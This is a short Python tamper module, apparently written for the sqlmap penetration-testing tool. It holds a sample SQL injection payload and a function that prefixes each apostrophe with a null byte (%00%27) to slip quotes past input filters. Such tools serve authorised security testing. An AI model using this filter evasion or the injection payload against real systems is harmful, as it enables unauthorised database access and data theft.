__example_payload__ = "' )) AND 1=1 ' OR '2'='3 --'"
__type__ = "hiding the apostrophe by passing it with a NULL character"


def tamper(payload, **kwargs):
    payload = str(payload)
    identifier = "'"
    return "".join("%00%27" if char == identifier else char for char in payload)
